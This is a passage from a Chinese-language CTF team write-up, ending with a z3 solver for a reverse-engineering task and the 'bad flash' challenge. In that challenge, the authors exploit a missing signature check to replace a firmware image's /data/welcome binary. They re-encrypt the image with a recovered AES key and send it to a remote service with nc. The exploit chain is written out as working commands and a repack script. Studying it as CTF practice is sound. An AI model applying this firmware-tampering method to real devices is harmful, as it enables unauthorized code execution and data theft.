<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n -e <span class="string">&quot;\x1&quot;</span> | <span class="built_in">dd</span> of=/dev/port bs=1 seek=$((<span class="number">0</span>xc040 + <span class="number">0</span>x1)) count=1 conv=notrunc status=none</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>z3写一下加密逻辑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># cipher = [0xABA29EC2A98DD89A, 0xBBF1B4AB81B4A9D4, 0xFB92A48DB386FFA8, 0xEFB491B8AFB4ABD3, 0x80EF69F1CBD00397, 0xB2EB07859CDA52D3, 0xEC9E22F5A5A07FA3, 0x4B36DF7B5B655A84]</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">b&#x27;\x9a\xd8\x8d\xa9\xc2\x9e\xa2\xab\xd4\xa9\xb4\x81\xab\xb4\xf1\xbb\xa8\xff\x86\xb3\x8d\xa4\x92\xfb\xd3\xab\xb4\xaf\xb8\x91\xb4\xef\x97\x03\xd0\xcb\xf1i\xef\x80\xd3R\xda\x9c\x85\x07\xeb\xb2\xa3\x7f\xa0\xa5\xf5&quot;\x9e\xec\x84Ze[&#123;\xdf6K&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cipher = list(cipher)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># round_cnt = 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># delta = 16</span></span><br><span class="line"><span class="comment"># xor_val = delta * (round_cnt - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(round_cnt // 2):</span></span><br><span class="line"><span class="comment">#     for j in range(0x20):</span></span><br><span class="line"><span class="comment">#         cipher[0x20 + j] ^= ((xor_val + j) &amp; 0xff) ^ cipher[j]</span></span><br><span class="line"><span class="comment">#     xor_val -= delta</span></span><br><span class="line"><span class="comment">#     for j in range(0x20):</span></span><br><span class="line"><span class="comment">#         cipher[j] ^= ((xor_val + j) &amp; 0xff) ^ cipher[j + 0x20]</span></span><br><span class="line"><span class="comment">#     xor_val -= delta</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(bytes(cipher))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">xs = [BitVec(<span class="string">f&#x27;x<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>)]</span><br><span class="line"></span><br><span class="line">order = xs.copy()</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x1234ac7f</span></span><br><span class="line">iv = [<span class="number">0x7f</span>, <span class="number">0xac</span>, <span class="number">0x34</span>, <span class="number">0x12</span>] * <span class="number">8</span></span><br><span class="line"><span class="comment"># iv = [BitVec(&#x27;iv&#x27;, 8)] * 0x20</span></span><br><span class="line"></span><br><span class="line">xor_val = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    base = i * <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        iv[j] = iv[j] ^ ((j + xor_val) &amp; <span class="number">0xff</span>)</span><br><span class="line">        xs.append(xs[base + j] ^ xs[base + j + <span class="number">0x20</span>] ^ iv[j])</span><br><span class="line">    xor_val += <span class="number">17</span></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">cmp = xs[-<span class="number">0x40</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(cmp) == <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    s.add(xs[i] &lt;= <span class="number">0x7f</span>)</span><br><span class="line">    s.add(xs[i] &gt;= <span class="number">0x20</span>)</span><br><span class="line">    s.add(cmp[i] == cipher[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> order:</span><br><span class="line">        flag.append(<span class="built_in">int</span>(<span class="string">f&#x27;<span class="subst">&#123;m[i]&#125;</span>&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br><span class="line">        <span class="comment"># print(f&quot;&#123;i&#125; : &quot;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no sol&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>主要在于有个初值, 原本假设为0, 所以z3没跑出来, 后面用文档里的方案触发了加密函数, 调试看到了magic不是0</p>
<p>不懂为什么用pwn模板的pmio没法触发, 做pwn会比较麻烦</p>
<h3><span id="bad-flash">bad flash</span><a href="#bad-flash" class="header-anchor"></a></h3><p>nc发送的数据被作为程序的标准输入，分析发现接受两种类型的cmd，这里直接用shell语句构造。由于要求每个cmd总长度为256，这里用printf补0x00</p>
<ul>
<li><p>FLASH指令，cmd后面要接要flash进去的image文件内容，FLASHSZ指定的是image文件的长度</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 120.46.197.71 9999  &lt; &lt;(<span class="built_in">cat</span> &lt;(<span class="built_in">echo</span> -n <span class="string">&#x27;.COMLEN:256.OP:FLASH.FLASHSZ:1048904.&#x27;</span>) &lt;(<span class="built_in">printf</span> <span class="string">&#x27;\x00%.0s&#x27;</span> &#123;1..219&#125;) ./flash.img)</span><br></pre></td></tr></table></figure>

<p>执行显示成功</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; Start flashing...</span><br><span class="line">IMG_ID: c68941c31d91260ccdcc8b05fc17c009</span><br><span class="line">New banner program flashed.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>ECHO指令，后面不需要跟image文件，但是也要求cmd总长256.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 120.46.197.71 9999  &lt; &lt;(<span class="built_in">cat</span> &lt;(<span class="built_in">echo</span> -n <span class="string">&#x27;.COMLEN:256.OP:ECHO.FLASHSZ:0.&#x27;</span>) &lt;(<span class="built_in">printf</span> <span class="string">&#x27;\x00%.0s&#x27;</span> &#123;1..226&#125;))  </span><br></pre></td></tr></table></figure></li>
</ul>
<p>执行得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; Fl4sh the device to display a welcome message.</span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure>

<p>注意到可以一次nc里带多个cmd，例如先FLASH再ECHO，但是也没有什么变化。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 120.46.197.71 9999  &lt; &lt;(<span class="built_in">cat</span> &lt;(<span class="built_in">echo</span> -n <span class="string">&#x27;.COMLEN:256.OP:FLASH.FLASHSZ:1048904.&#x27;</span>) &lt;(<span class="built_in">printf</span> <span class="string">&#x27;\x00%.0s&#x27;</span> &#123;1..219&#125;) ./flash.img &lt;(<span class="built_in">echo</span> -n <span class="string">&#x27;.COMLEN:256.OP:ECHO.FLASHSZ:0.&#x27;</span>) &lt;(<span class="built_in">printf</span> <span class="string">&#x27;\x00%.0s&#x27;</span> &#123;1..226&#125;))</span><br></pre></td></tr></table></figure>

<p>以上FLASH过程在本地执行时报0x09错误，死在了verify_header()函数上，猜测是本地和远程的verify_header()实现不同，用binpatch掉这个verify_header()，本地跑可以跑到后面flash_to_file()生成&#x2F;data&#x2F;tmp-plain-img，其中没有flag，但是有个NOTICE提示flash过程是突破点。</p>
<p>分析image结构：</p>
<ul>
<li>[0:72]是头信息</li>
<li>[72: 72+128]是RSA1024的签名，elf文件里含有4个公钥，用的是最后那个</li>
<li>[72+128: 72+128+128]是用RSA1024加密后的aes密钥，用gdb断点在aes_decrypt_image()上可以获得aes key和iv</li>
<li>[72+128+128: 末尾]是AES CBC mode加密的ext4文件，里面有一个NOTION文件提示了要替换&#x2F;data&#x2F;welcome，从&#x2F;data&#x2F;flag读出flag</li>
</ul>
<p>分析发现负责签名验证的verify_signature()函数没有验签</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=OTIyMDMzNTNmYjE3OGY5NDk1YTZmNzE2YWVjMWU0MTRfZzN6V1hDTm9yNDdHVDlHTDRPOXVDOU5GYjc5M0ZSMHFfVG9rZW46VGRhOGJHdTdqb2xYUDF4VGFzeGNja2JtbjBlXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>可以拿gdb断点在aes_decrypt_image()上可以获得aes key和iv以及解密后的ext4文件。拿losetup和mount挂载这个ext4文件，然后编一个aarch64的elf文件换掉里面的&#x2F;data&#x2F;welcome然后umount。</p>
<p>再重新加密回去替换掉原来image文件的[72+128+128: 末尾]部分即可构造可以被远端接受的image：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;c510ba99d16f48a319e86b5ac572c4a933dec0656d8dfc77dc81867010c6401a&#x27;</span>)</span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;b624b5e252a6b1805a5fc3374b5144c8&#x27;</span>)</span><br><span class="line">myCipher = AES.new(key, AES.MODE_CBC, iv=iv)</span><br><span class="line"><span class="comment"># repack</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flash.img&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    bs = file.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;repacked_fs.bin&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    fs = file.read()</span><br><span class="line">enfs = myCipher.encrypt(fs)</span><br><span class="line"></span><br><span class="line">bs = bs[:<span class="number">72</span>+<span class="number">128</span>+<span class="number">128</span>] + enfs</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;repacked_flash.img&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(bs)</span><br></pre></td></tr></table></figure>

<p>先FLASH再ECHO</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">120.46</span><span class="number">.197</span><span class="number">.71</span> <span class="number">9999</span>  &lt; &lt;(cat &lt;(echo -n <span class="string">&#x27;.COMLEN:256.OP:FLASH.FLASHSZ:1048904.&#x27;</span>) &lt;(printf <span class="string">&#x27;\x00%.0s&#x27;</span> &#123;<span class="number">1.</span><span class="number">.219</span>&#125;) ./repacked_flash.img &lt;(echo -n <span class="string">&#x27;.COMLEN:256.OP:ECHO.FLASHSZ:0.&#x27;</span>) &lt;(printf <span class="string">&#x27;\x00%.0s&#x27;</span> &#123;<span class="number">1.</span><span class="number">.226</span>&#125;))</span><br></pre></td></tr></table></figure>
</div><div class="article-licensing box"><div class="licensing-title"><p>2023 ACTF SU WriteUp</p><p><a href="https://team-su.github.io/posts/21240.html">https://team-su.github.io/posts/21240.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2023-10-30</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-13</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/ACTF/">ACTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/28185.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2024 RCTF SU WriteUp</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/40828.html"><span class="level-item">2023 巅峰极客决赛  SU WriteUp</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><!--!--></body></html>